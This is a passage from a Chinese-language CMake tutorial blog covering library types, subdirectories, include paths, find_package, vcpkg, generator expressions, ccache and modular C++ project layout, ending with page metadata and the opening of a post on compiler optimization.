3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib STATIC hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) 动态库 生成静态库 hellolib.so 123456cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib SHARED hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) 对象库 123456cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_library(hellolib OBJECT hello.cpp)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) 对象库类似于静态库，但不生成 .a 文件，只由 CMake 记住该库生成了哪些对象文件。 对象库是 CMake 自创的，绕开了编译器和操作系统的各种繁琐规则，保证了跨平台统一性。 对象库可保证不会自动剔除没引用到的对象文件。而静态库会自动剔除。 动态库中链接静态库 让静态库编译时也生成位置无关的代码(PIC)，这样才能装在动态库里。 12345678add_library(otherlib STATIC otherlib.cpp)set_property(TARGET otherlib PROPERTY POSITION_INDEPENDENT_CODE ON)add_library(mylib SHARED mylib.cpp)target_link_libraries(mylib PUBLIC otherlib)add_executable(main main.cpp)target_link_libraries(main PUBLIC mylib) PUBLIC 表示所有依赖lib的target都自动绑定了该头文件路径 PRIVATE 表示该头文件路径仅对本target有效 INTERFACE 表示该头文件路径仅对依赖该lib的target生效 PUBLIC = PRIVATE + INTERFACE 子模块 有工程文件： 12345678├─ hellolib│ ├─ CMakeLists.txt│ ├─ hello.cpp│ └─ hello.h├─ CMakeLists.txt├─ main.cpp├─ r.md└─ run.sh cmake文件： 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) 子目录下，cmake文件： 1add_library(hellolib STATIC hello.cpp) add_subdirectory 添加子目录，子目录也包含一个 CMakeLists.txt，其中定义的库在 add_subdirectory 之后就可以在主目录的文件中使用。 如果指定头文件搜索目录： 12345678cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib)target_include_directories(a.out PUBLIC hellolib) 这样甚至可以用 &lt;hello.h&gt; 来引用这个头文件了，因为通过 target_include_directories 指定的路径会被视为与系统路径等价。这里指定了 hellolib 文件夹名称。 target_link_libraries(a.out PUBLIC hellolib) 中的 hellolib 为子模块的库名。 但是如果有 b.out 也引用了 hellolib： 12target_include_directories(a.out PUBLIC hellolib)target_include_directories(b.out PUBLIC hellolib) 要重复指定路径吗？ 其实只需要在 hellolib 文件夹下的 cmakelists.txt 中指定 hellolib (库名) 的文件路径，设为 PUBLIC ，让使用到 hellolib 的可执行文件自动添加搜索路径即可。 12add_library(hellolib STATIC hello.cpp)target_include_directories(hellolib PUBLIC .) 此时主目录下的 cmakelists.txt ： 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(hellolib)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC hellolib) 不需要 target_include_directories 设置了。 其他选项 12345678910target_include_directories(myapp PUBLIC /usr/include/eigen3) # 添加头文件搜索目录target_link_libraries(myapp PUBLIC hellolib) # 添加要链接的库target_add_definitions(myapp PUBLIC MY_MACRO=1) # 添加一个宏定义target_add_definitions(myapp PUBLIC -DMY_MACRO=1) # 与上一个等价target_compile_options(myapp PUBLIC -fopenmp) # 添加编译器命令行选项# 当使用了 PUBLIC ，链接了 myapp 的文件编译会自动加上 -fopenmptarget_sources(myapp PUBLIC hello.cpp other.cpp) # 添加要编译的源文件 以及可以通过下列指令（不推荐使用），把选项加到所有接下来的目标去： 1234include_directories(/opt/cuda/include) # 添加头文件搜索目录到 cmakelists.txt 下文定义的所有目标文件link_directories(/opt/cuda) # 添加库文件的搜索路径到 cmakelists.txt 下文定义的所有目标文件add_definitions(MY_MACRO=1) # 添加一个宏定义到 cmakelists.txt 下文定义的所有目标文件add_compile_options(-fopenmp) # 添加编译器命令行选项到 cmakelists.txt 下文定义的所有目标文件 第三方库 纯头文件库 最友好的一类库莫过于纯头文件库了，这里是一些好用的 header-only 库： nothings/stb - 大名鼎鼎的 stb_image 系列，涵盖图像，声音，字体等，只需单头文件！ Neargye/magic_enum - 枚举类型的反射，如枚举转字符串等（实现方式很巧妙） g-truc/glm - 模仿 GLSL 语法的数学矢量/矩阵库（附带一些常用函数，随机数生成等） Tencent/rapidjson - 单纯的 JSON 库，甚至没依赖 STL（可定制性高，工程美学经典） ericniebler/range-v3 - C++20 ranges 库就是受到他启发（完全是头文件组成） fmtlib/fmt - 格式化库，提供 std::format 的替代品（需要 -DFMT_HEADER_ONLY） gabime/spdlog - 能适配控制台，安卓等多后端的日志库（和 fmt 冲突！） 只需要把他们的 include 目录或头文件下载下来，然后 include_directories(spdlog/include) 即可。 缺点：函数直接实现在头文件里，没有提前编译，从而需要重复编译同样内容，编译时间长。 12345cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp)target_include_directories(a.out PUBLIC glm/include) git clone git@github.com:g-truc/glm.git --depth=1 # depth=1 更快，不想做贡献的话，这样就好 子模块 第二友好的方式则是作为 CMake 子模块引入，也就是通过 add_subdirectory。 方法就是把那个项目（以fmt为例）的源码放到你工程的根目录： 这些库能够很好地支持作为子模块引入： fmtlib/fmt - 格式化库，提供 std::format 的替代品 gabime/spdlog - 能适配控制台，安卓等多后端的日志库 ericniebler/range-v3 - C++20 ranges 库就是受到他启发 g-truc/glm - 模仿 GLSL 语法的数学矢量/矩阵库 abseil/abseil-cpp - 旨在补充标准库没有的常用功能 bombela/backward-cpp - 实现了 C++ 的堆栈回溯便于调试 google/googletest - 谷歌单元测试框架 google/benchmark - 谷歌性能评估框架 glfw/glfw - OpenGL 窗口和上下文管理 libigl/libigl - 各种图形学算法大合集 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_subdirectory(fmt)add_executable(a.out main.cpp)target_link_libraries(a.out PUBLIC fmt) 引用系统中预安装的第三方库 预安装--可以解决子模块方式中可能会出现的菱形依赖的问题。 使用 apt 或者 pacman 或者 yum 安装。 可以通过 find_package 命令寻找系统中的包/库： 1234567cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp)find_package(fmt REQUIRED)target_link_libraries(a.out PUBLIC fmt::fmt) 为什么是 fmt::fmt 而不是简单的 fmt？ 现代 CMake 认为一个包 (package) 可以提供多个库，又称组件 (components)，比如 TBB 这个包，就包含了 tbb, tbbmalloc, tbbmalloc_proxy 这三个组件。 因此为避免冲突，每个包都享有一个独立的名字空间，以 :: 的分割（和 C++ 还挺像的）。 你可以指定要用哪几个组件： 123find_package(TBB REQUIRED COMPONENTS tbb tbbmalloc REQUIRED)target_link_libraries(myexec PUBLIC TBB::tbb TBB::tbbmalloc) 像Qt5 这种项目，find_package就需要指定出需要的组件的名称。 Windows 上找不到 Qt5 包怎么办？手动指定 Qt5_DIR。 123456add_executable(main main.cpp)set(Qt5_DIR C:/Qt/Qt5.14.2/msvc2019_64/lib/cmake)find_package(Qt5 REQUIRED COMPONENTS Widgets Gui REQUIRED)target_link_libraries(main PUBLIC Qt5::Widgets Qt5::Gui) 或者在命令行编译cmake时，指定 -DQt5-DIR 参数。 Windows 则没有自带的包管理器。因此可以用跨平台的 vcpkg：https://github.com/microsoft/vcpkg 使用方法：下载 vcpkg 的源码，放到你的项目根目录，像这样： 12345678910111213&gt; cd vcpkg&gt; .\\bootstrap-vcpkg.bat&gt; .\\vcpkg integrate install&gt; .\\vcpkg install fmt:x64-windows&gt; cd ..&gt; cmake -Bbuild -DCMAKE_TOOLCHAIN_FILE=\"%CD%/vcpkg/scripts/buildsystems/vcpkg.cmake\" 多源文件 GLOB_RECURSE 能自动包含所有子文件夹下的文件，注意先将所有源代码文件统一组织到 src 文件夹下，将build目录与src目录分开。 123add_executable(main)file(GLOB_RECURSE sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;) CONFIGURE_DEPENDS：自动更新新加的文件。 1234add_executable(main)aux_source_directory(. sources)aux_source_directory(mylib sources)target_sources(main PUBLIC $&#123;sources&#125;) 用 aux_source_directory，可以自动搜集需要的文件后缀名。 CMake 参数选项 构建的类型 Debug: -O0 -g Release: -O3 -DNDEBUG MinSizeRel: -Os -DNDEBUG RelWithDebInfo: -O2 -g -DNDEBUG 初始化项目信息 1234567891011cmake_minimum_required(VERSION 3.15)project(hellocmake)message(\"PROJECT_NAME: $&#123;PROJECT_NAME&#125;\")message(\"PROJECT_SOURCE_DIR: $&#123;PROJECT_SOURCE_DIR&#125;\")message(\"PROJECT_BINARY_DIR: $&#123;PROJECT_BINARY_DIR&#125;\")message(\"CMAKE_CURRENT_SOURCE_DIR: $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;\")message(\"CMAKE_CURRENT_BINARY_DIR: $&#123;CMAKE_CURRENT_BINARY_DIR&#125;\")add_executable(main main.cpp)add_subdirectory(mylib) PROJECT_SOURCE_DIR：当前项目源码路径（存放main.cpp的地方） PROJECT_BINARY_DIR：当前项目输出路径（存放main.exe的地方） CMAKE_SOURCE_DIR：根项目源码路径（存放main.cpp的地方） CMAKE_BINARY_DIR：根项目输出路径（存放main.exe的地方） PROJECT_IS_TOP_LEVEL：BOOL类型，表示当前项目是否是（最顶层的）根项目 PROJECT_NAME：当前项目名 CMAKE_PROJECT_NAME：根项目的项目名 利用 PROJECT_SOURCE_DIR 可以实现从子模块里直接获得项目最外层目录的路径。 不建议用 CMAKE_SOURCE_DIR，那样会让你的项目无法被人作为子模块使用。 LANGUAGES 字段支持的语言包括： C：C语言 CXX：C++语言 ASM：汇编语言 Fortran：老年人的编程语言 CUDA：英伟达的 CUDA（3.8 版本新增） OBJC：苹果的 Objective-C（3.16 版本新增） OBJCXX：苹果的 Objective-C++（3.16 版本新增） ISPC：一种因特尔的自动 SIMD 编程语言（3.18 版本新增） 如果不指定 LANGUAGES，默认为 C 和 CXX。 使用CMAKE_CXX_STANDARD 变量，而不是使用 options 指定 -std=c++17。这样跨平台方便。 若设置了项目名，会自动设置另外 _SOURCE_DIR 等变量。 对象的属性 1234567891011add_executable(main main.cpp)set_target_properties(main PROPERTIES CXX_STANDARD 17 # 采用 C++17 标准进行编译（默认 11） CXX_STANDARD_REQUIRED ON # 如果编译器不支持 C++17，则直接报错（默认 OFF） WIN32_EXECUTABLE ON # 在 Windows 系统中，运行时不启动控制台窗口，只有 GUI 界面（默认 OFF） LINK_WHAT_YOU_USE ON # 告诉编译器不要自动剔除没有引用符号的链接库（默认 OFF） LIBRARY_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/lib # 设置动态链接库的输出路径（默认 $&#123;CMAKE_BINARY_DIR&#125;） ARCHIVE_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/lib # 设置静态链接库的输出路径（默认 $&#123;CMAKE_BINARY_DIR&#125;） RUNTIME_OUTPUT_DIRECTORY $&#123;CMAKE_SOURCE_DIR&#125;/bin # 设置可执行文件的输出路径（默认 $&#123;CMAKE_BINARY_DIR&#125;） ) windows 中 dll 的搜索路径在 exe 的同目录下，以及环境变量中。而 Linux 中，可执行文件会有RPATH属性字段，自动指向它链接到的 .so 库文件。 编译时消息 message 指令可以在编译时输出字符串内容。 message(STATUS “...”) 表示信息类型是状态信息，有 -- 前缀； message(WARNING “...”) 表示是警告信息； message(AUTHOR_WARNING “...”) 表示是仅仅给项目作者看的警告信息； message(FATAL_ERROR “...”) 表示是错误信息，会终止 CMake 的运行； message(SEND_ERROR “...”) 表示是错误信息，但之后的语句仍继续执行； CMake缓存 CMake 第一遍需要检测编译器和 C++ 特性等比较耗时，检测完会把结果存储到缓存中，这样第二遍运行 cmake -B build 时就可以直接用缓存的值。 有时候外部的情况有所更新，这时候 CMake 里缓存的却是旧的值，会导致一系列问题。 最简单的办法就是删除 build 文件夹。 若不想从头重新编译，可以只删除 build/CMakeCache.txt 这个文件。 CMake跨平台 根据不同操作系统，定义宏： 1234567891011add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)if (WIN32) target_compile_definitions(main PUBLIC MY_NAME=\"Bill Gates\")elseif (UNIX AND NOT APPLE) target_compile_definitions(main PUBLIC MY_NAME=\"Linus Torvalds\")elseif (APPLE) target_compile_definitions(main PUBLIC MY_NAME=\"Steve Jobs\")endif() 使用生成器表达式可以写成： 123456789add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)target_compile_definitions(main PUBLIC $&lt;$&lt;PLATFORM_ID:Windows&gt;:MY_NAME=\"Bill Gates\"&gt; $&lt;$&lt;PLATFORM_ID:Linux&gt;:MY_NAME=\"Linus Torvalds\"&gt; $&lt;$&lt;PLATFORM_ID:Darwin&gt;:MY_NAME=\"Steve Jobs\"&gt; ) CXX_COMPILER_ID 可以判断编译器类型： 12345678add_executable(main)file(GLOB sources CONFIGURE_DEPENDS *.cpp *.h)target_sources(main PUBLIC $&#123;sources&#125;)target_compile_definitions(main PUBLIC $&lt;$&lt;CXX_COMPILER_ID:GNU,Clang&gt;:MY_NAME=\"Open-source\"&gt; $&lt;$&lt;CXX_COMPILER_ID:MSVC,NVIDIA&gt;:MY_NAME=\"Commercial\"&gt; ) 变量与判断 父模块里定义的变量，会传递给子模块。但是子模块里定义的变量，不会传递给父模块。 可以使用 ${xx} 访问的是局部变量，$ENV{xx} 访问系统的环境变量，用 $CACHE{xx} 来访问缓存里的 xx 变量。 if (DEFINED ENV{xx}) 可以判断某环境变量是否存在。if (xx) 可以判断某变量是否存在且不为空字符串。因为空字符串等价于 FALSE。 CCache 编译加速缓存 123456789cmake_minimum_required(VERSION 3.15)project(hellocmake)find_program(CCACHE_PROGRAM ccache)if (CCACHE_PROGRAM) message(STATUS \"Found CCache: $&#123;CCACHE_PROGRAM&#125;\") set_property(GLOBAL PROPERTY RULE_LAUNCH_COMPILE $&#123;CCACHE_PROGRAM&#125;) set_property(GLOBAL PROPERTY RULE_LAUNCH_LINK $&#123;CCACHE_PROGRAM&#125;)endif() gcc 编译使用方法，把 gcc -c main.cpp -o main 换成 ccache gcc -c main.cpp -o main 即可。 CMake 项目管理模块化指南 目录组织格式： 项目名/include/项目名/模块名.h 项目名/src/模块名.cpp CMakeLists.txt 中写： target_include_directories(项目名 PUBLIC include) 源码文件中写： #include &lt;项目名/模块名.h&gt; 项目名::函数名(); 头文件（项目名/include/项目名/模块名.h）中写： 1234#pragma oncenamespace 项目名 &#123; void 函数名();&#125; 实现文件（项目名/src/模块名.cpp）中写： 1234#include &lt;项目名/模块名.h&gt;namespace 项目名 &#123; void 函数名() &#123; 函数实现 &#125;&#125; 示例 示例组织方式： 12345678910111213141516171819├── biology│ ├── CMakeLists.txt│ ├── include│ │ └── biology│ │ ├── Animal.h│ │ └── Carer.h│ └── src│ ├── Animal.cpp│ └── Carer.cpp├── cmake│ └── MyUsefulFuncs.cmake├── CMakeLists.txt└── pybmain ├── CMakeLists.txt ├── include │ └── pybmain │ └── myutils.h └── src └── main.cpp 大型的项目，往往会划分为几个子项目。即只有一个子项目，也建议创建一个子目录，方便以后追加新的子项目。 上面的例子中，在根目录下，创建了两个子项目 biology 和 pybmain，他们分别在各自的目录下有自己的 CMakeLists.txt。 12345678910111213141516cmake_minimum_required(VERSION 3.18)if (NOT CMAKE_BUILD_TYPE) set(CMAKE_BUILD_TYPE Release)endif()set(CMAKE_CXX_STANDARD 20)set(CMAKE_CXX_STANDARD_REQUIRED ON)set(CMAKE_CXX_EXTENSIONS OFF)set(CMAKE_MODULE_PATH \"$&#123;CMAKE_CURRENT_LIST_DIR&#125;/cmake;$&#123;CMAKE_MODULE_PATH&#125;\")project(CppCMakeDemo LANGUAGES CXX)include(MyUsefulFuncs)add_subdirectory(pybmain)add_subdirectory(biology) 在根项目的 CMakeLists.txt 中，设置了默认的构建模式，设置了统一的 C++ 版本等各种选项。 然后通过 project 命令初始化了根项目。随后通过 add_subdirectory 把两个子项目 pybmain 和 biology 添加进来，这会调用 pybmain/CMakeLists.txt 和 biology/CMakeLists.txt。 123file(GLOB_RECURSE srcs CONFIGURE_DEPENDS src/*.cpp include/*.h)add_library(biology STATIC $&#123;srcs&#125;)target_include_directories(biology PUBLIC include) 子项目的 CMakeLists.txt 就干净许多，只是创建了 biology 这个静态库对象，并通过 GLOB_RECRUSE 为他批量添加了所有位于 src 和 include 下源码和头文件。 根项目的 CMakeLists.txt 负责处理全局有效的设定。而子项目的 CMakeLists.txt 则仅考虑该子项目自身的设定，比如他的头文件目录，要链接的库等等。 这里给 biology 设置了头文件搜索路径 include。因为子项目的 CMakeLists.txt 里指定的路径都是相对路径，所以这里指定 include 实际上是：根/biology/include。 使用 PUBLIC 修饰符，这是为了让链接 biology 的 pybmain 也能够共享 根/biology/include 这个头文件搜索路径。 这里我们给 biology 批量添加了 src/*.cpp 下的全部源码文件。 明明只有 *.cpp 需要编译，为什么还添加了 include/*.h？为了头文件也能被纳入 Vs Code 的项目资源浏览器，方便编辑。 因为子项目的 CMakeLists.txt 里指定的路径都是相对路径，所以这里指定 src 实际上是：根/biology/src。 GLOB_RECURSE 相比 GLOB ，GLOB_RECURSE 会对 *.cpp 进行嵌套目录的搜索匹配。 CONFIGURE_DEPENDS 选项则是用于自动检测目录更新。如果不添加，每次添加新文件后，需要重新运行 cmake -B build 才能更新项目的符号链接之类的。如果添加了，运行 cmake --build 时检测到目录有新文件了，CMake 会自动帮你重新运行 cmake -B build 更新。 头文件和源文件组织 头文件和源文件应保持一一对应的关系。 通常每个头文件都有一个对应的源文件，两个文件名字应当相同，只有后缀名不一样。头文件中包含函数和类的声明，源文件则包含他们的实现。 如果是一个类，则文件名应和类名相同，方便查找（Animal.cpp）。 123456789101112131415161718192021#Animal.h#pragma once#include &lt;ostream&gt;namespace biology &#123;struct Animal &#123; virtual void speak(std::ostream &amp;os) const = 0; virtual ~Animal() = default;&#125;;struct Cat : Animal &#123; virtual void speak(std::ostream &amp;os) const override;&#125;;struct Dog : Animal &#123; virtual void speak(std::ostream &amp;os) const override;&#125;;&#125; 12345678910111213#include &lt;biology/Animal.h&gt;namespace biology &#123;void Cat::speak(std::ostream &amp;os) const &#123; os &lt;&lt; \"Meow~\";&#125;void Dog::speak(std::ostream &amp;os) const &#123; os &lt;&lt; \"Wang!\";&#125;&#125; 头文件中函数定义 有时会直接把实现直接写在头文件里，这时可以没有与之对应的源文件，只有一个头文件。 注意：在头文件里直接实现函数时，要加 static 或 inline 关键字。 123456789101112131415161718# pybmain/include/pybmain/myutils.h#pragma once#include &lt;string&gt;#include &lt;cctype&gt;namespace pybmain &#123;static std::string alluppercase(std::string s) &#123; std::string ret; for (char c: s) &#123; ret.push_back(std::toupper(c)); &#125; return ret;&#125;&#125; 添加新功能 添加一个新功能模块时，同时添加同名的源文件和头文件。头文件中的声明和源文件中的实现一一对应。 如果新模块中用到了其他模块的类或函数，则需要在新模块的头文件和源文件中都导入其他模块的头文件。 注意不论是项目自己的头文件还是外部的系统的头文件，请全部统一采用 &lt;项目名/模块名.h&gt; 的格式。不要用 “模块名.h” 这种相对路径的格式，避免模块名和系统已有头文件名冲突。 1234567891011121314# biology/include/biology/Carer.h#pragma once#include &lt;string&gt;namespace biology &#123;struct Animal;struct Carer &#123; std::string care(Animal *a) const;&#125;;&#125; 123456789101112131415# biology/src/Carer.cpp#include &lt;biology/Carer.h&gt;#include &lt;biology/Animal.h&gt;#include &lt;sstream&gt;namespace biology &#123;std::string Carer::care(Animal *a) const &#123; std::ostringstream ss; a-&gt;speak(ss); return ss.str();&#125;&#125; 注意上面的 struct Animal; 写法，并没有导入头文件。 如果模块 Carer 的头文件 Carer.h 虽然引用了其他模块中的 Animal 类，但是他里面并没有解引用 Animal，只有源文件 Carer.cpp 解引用了 Animal。那么这个头文件是不需要导入 Animal.h 的，只需要一个前置声明 struct Animal，只有实际调用了 Animal 成员函数的源文件需要导入 Animal.h。 这样做的好处是，可以加快编译速度，防止循环引用。 在声明和定义外面都套一层名字空间，例如此处子项目名是 biology，那就使用 biology::Animal。避免暴露全局的 Animal。 这是因为万一有个“不拘一格”的第三方库也暴露个全局的 Animal，两个符号就会发生冲突。 由于类符号都具有 weak 属性，链接器会随机选择一个覆盖掉，非常危险！ 如果一个子项目依赖另一个子项目，则需要链接他。 让 pybmain 链接上 biology： 1target_link_libraries(pybmain PUBLIC biology) 由于 PUBLIC 属性具有传染性，根/biology/include 现在也加入 pybmain 的头文件搜索路径了，因此 pybmain 里可以 #include 到 biology 的头文件。 同理如果又有一个 target_link_libraries(zxxpig PUBLIC pybmain) 那么 zxxpig 也有 pybmain 和 biology 的所有头文件搜索路径了。 CMake 也有 include 功能 和 C/C++ 的 #include 一样，CMake 也有一个 include 命令。 你写 include(XXX) 时，则他会在 CMAKE_MODULE_PATH 这个列表中的所有路径下查找 XXX.cmake 这个文件。那么在 XXX.cmake 里，就可以写一些你常用的函数，宏，变量等。 123456789101112131415# 一个 xxx.cmake 文件示例macro (my_add_target name type) # 用法: my_add_target(pybmain EXECUTABLE) file(GLOB_RECURSE srcs CONFIGURE_DEPENDS src/*.cpp src/*.h) if (\"$&#123;type&#125;\" MATCHES \"EXECUTABLE\") add_executable($&#123;name&#125; $&#123;srcs&#125;) else() add_library($&#123;name&#125; $&#123;type&#125; $&#123;srcs&#125;) endif() target_include_directories($&#123;name&#125; PUBLIC include)endmacro()set(SOME_USEFUL_GLOBAL_VAR ON)set(ANOTHER_USEFUL_GLOBAL_VAR OFF) 导入方式是在 CMakeLists.txt 中添加： 123456set(CMAKE_MODULE_PATH \"$&#123;CMAKE_CURRENT_LIST_DIR&#125;/cmake;$&#123;CMAKE_MODULE_PATH&#125;\")include(MyUsefulFuncs)# 对应于目录中以下文件# ├── cmake# │ └── MyUsefulFuncs.cmake macro 和 function 的区别 macro 相当于直接把代码粘贴过去，直接访问调用者的作用域。这里写的相对路径 include 和 src，是基于调用者所在路径。 function 则是会创建一个闭包，优先访问定义者的作用域。这里写的相对路径 include 和 src，则是基于定义者所在路径。 include 和 add_subdirectory 的区别 include 相当于直接把代码粘贴过去，直接访问调用者的作用域。这里创建的变量和外面共享，直接 set(key val) 则调用者也有 ${key} 这个变量了。 add_subdirectory 这类 function 中，则是基于定义者所在路径，优先访问定义者的作用域。这里需要在在被包含的子项目中 set(key val PARENT_SCOPE) ，才能修改到外面的变量。 第三方库依赖 find_package 1234567891011121314151617181920find_package(OpenCV)查找名为 OpenCV 的包，找不到不报错，事后可以通过 $&#123;OpenCV_FOUND&#125; 查询是否找到。find_package(OpenCV QUIET)查找名为 OpenCV 的包，找不到不报错，也不打印任何信息。find_package(OpenCV REQUIRED) # 最常见用法查找名为 OpenCV 的包，找不到就报错（并终止 cmake 进程，不再继续往下执行）。find_package(OpenCV REQUIRED COMPONENTS core videoio)查找名为 OpenCV 的包，找不到就报错，且必须具有 OpenCV::core 和 OpenCV::videoio 这两个组件，如果没有这两个组件也会报错。find_package(OpenCV REQUIRED OPTIONAL_COMPONENTS core videoio)查找名为 OpenCV 的包，找不到就报错，可具有 OpenCV::core 和 OpenCV::videoio 这两个组件，没有这两组件不会报错，通过 $&#123;OpenCV_core_FOUND&#125; 查询是否找到 core 组件。find_package(OpenCV 2.0.1 REQUIRED)查找版本在 2.0.1 以上的 OpenCV 包（version &gt;= 2.0.1）find_package(OpenCV 2.0.1 EXACT REQUIRED)查找版本刚好为 2.0.1 的 OpenCV 包（version == 2.0.1） find_package(OpenCV) 实际上是在找一个名为 OpenCVConfig.cmake 的文件。 出于历史兼容性考虑，除了 OpenCVConfig.cmake 以外 OpenCV-config.cmake 这个文件名也会被 CMake 识别到。 同理，find_package(Qt5) 则是会去找名为 Qt5Config.cmake 的文件。 Qt5Config.cmake 是你安装 Qt5 时，随 libQt5Core.so 等实际的库文件，一起装到你的系统中去的。以 Arch Linux 系统为例：包配置文件位于 /usr/lib/cmake/Qt5/Qt5Config.cmake。实际的动态库文件位于 /usr/lib/libQt5Core.so。 因此 find_package 并不是直接去找具体的动态库文件和头文件（例如 libQt5Core.so）。而是去找包配置文件（例如Qt5Config.cmake），这个配置文件里包含了包的具体信息，包括动态库文件的位置，头文件的目录，链接时需要开启的编译选项等等。 而且某些库都具有多个子动态库，例如 Qt 就有 libQt5Core.so、libQt5Widgets.so、libQt5Network.so。因此 CMake 要求所有第三方库作者统一包装成一个 Qt5Config.cmake 文件包含所有相关信息（类似于 nodejs 的 package.json）。 包配置文件由第三方库的作者（Qt的开发团队）提供，在这个库安装时（Qt的安装程序或apt install等）会自动放到 /usr/lib/cmake/XXX/XXXConfig.cmake 这个路径（其中XXX是包名），供 CMake 用户找到并了解该包的具体信息。 /usr/lib/cmake 这个位置是 CMake 和第三方库作者约定俗成的，由第三方库的安装程序负责把包配置文件放到这里。如果第三方库的作者比较懒，没提供 CMake 支持（由安装程序提供XXXConfig.cmake），那么得用另外的一套方法（FindXXX.cmake）。 一个搜索路径的例子： 12345678910111213141516171819202122232425例如 64 位的 Linux 系统，find_package(Qt5 REQUIRED) 会依次搜索：/usr/lib/cmake/Qt5/Qt5Config.cmake/usr/lib/x86_64-linux-gnu/cmake/Qt5/Qt5Config.cmake/usr/share/cmake/Qt5/Qt5Config.cmake/usr/lib/Qt5/Qt5Config.cmake/usr/lib/x86_64-linux-gnu/Qt5/Qt5Config.cmake/usr/share/Qt5/Qt5Config.cmake/usr/Qt5/lib/cmake/Qt5/Qt5Config.cmake/usr/Qt5/lib/x86_64-linux-gnu/cmake/Qt5/Qt5Config.cmake/usr/Qt5/share/cmake/Qt5/Qt5Config.cmake/usr/Qt5/lib/Qt5/Qt5Config.cmake/usr/Qt5/lib/x86_64-linux-gnu/Qt5/Qt5Config.cmake/usr/Qt5/share/Qt5/Qt5Config.cmake例如 64 位的 Windows 系统，find_package(Qt5 REQUIRED) 会依次搜索：C:/Program Files/Qt5Config.cmakeC:/Program Files/cmake/Qt5Config.cmakeC:/Program Files/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/cmake/Qt5Config.cmakeC:/Program Files/Qt5/lib/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/x86_64-windows-gnu/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/share/cmake/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/lib/x86_64-windows-gnu/Qt5/Qt5Config.cmakeC:/Program Files/Qt5/share/Qt5/Qt5Config.cmake find_package找到配置文件 手动指定一个变量告诉配置文件在哪儿 可以是普通变量 ${Qt5_DIR} 123# 项目的 CMakeLists.txt 最开头写一行# 一定要加在最前面！！！set(Qt5_DIR ”D:/Qt5.12.1/msvc2017/lib/cmake/Qt5”) 可以是环境变量 $ENV{Qt5_DIR}，添加一个环境变量 Qt5_DIR 值为 D:/Qt5.12.1/msvc2017/lib/cmake/Qt5，在Linux中，可以export Qt5_DIR=\"/opt/Qt5.12.1/lib/cmake/Qt5\" 可以通过命令行 -DQt5_DIR=”C:/Program Files/Qt5.12.1/lib/cmake/Qt5” 设置 没有配置文件？ CMake 提供了一些 Find 配置： 12/usr/share/cmake/Modules/FindCUDAToolkit.cmake/usr/share/cmake/Modules/FindPython.cmake github 上也有开源的FindXXX.cmake 配置文件。 使用方法 1234567891011# 旧版本：find_package(XXX)if (NOT XXX_FOUND) message(FATAL_ERROR “XXX not found”)endif()target_include_directories(yourapp $&#123;XXX_INCLUDE_DIRS&#125;)target_link_libraries(yourapp $&#123;XXX_LIBRARIES&#125;)# 现代：find_package(XXX REQUIRED COMPONENTS xxx)target_link_libraries(yourapp XXX::xxx) 大部分第三方库都需要提前安装好，然后再 find_package 找到他，然后才能链接。也有少数第三方库为了方便，还支持作为子项目加到项目中来，这种就不需要 :: 语法。 123456find_package(spdlog REQUIRED)target_link_libraries(yourapp PUBLIC spdlog::spdlog)# 添加源码到子目录下的方式add_subdirectory(spdlog) # 需要下载好源码放到你的根目录下target_link_libraries(yourapp PUBLIC spdlog) Unix 软件从源码安装的通用方法 123456789## Makefile 构建系统：./configure --prefix=/usr --with-some-options # 生成 Makefile（这个 configure 脚本由 Autoconf 生成）make -j 8 # 8 核心编译，生成 libtest.sosudo make install # 安装，拷贝到 /usr/lib/libtest.so## CMake 构建系统：cmake -B build -DCMAKE_INSTALL_PREFIX=/usr -DWITH_SOME_OPTIONS=ON # 生成 Makefilecmake --build build --parallel 8 # 8 核心编译，生成 libtest.sosudo cmake --build build --target install # 安装，拷贝到 /usr/lib/libtest.so 注：如果 -DCMAKE_INSTALL_PREFIX=/usr/local 则会拷贝到 /usr/local/lib/libtest.so","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CMake","slug":"Notes/CMake","permalink":"https://racleray.github.io/categories/Notes/CMake/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"CMake","slug":"CMake","permalink":"https://racleray.github.io/tags/CMake/"}],"author":"HeRui"},{"title":"C++编译器优化","slug":"C-编译器优化","date":"2023-05-12T14:25:36.000Z","updated":"2024-01-09T10:19:48.220Z","comments":true,"path":"posts/f78760c9.html","link":"","permalink":"https://racleray.github.io/posts/f78760c9.html","excerpt":"C++编译器优化笔记","text":"x64寄存器模型 32 位 x86 架构中的通用寄存器有：eax, ecx, edx, ebx, esi, edi, esp, ebp 其中 esp 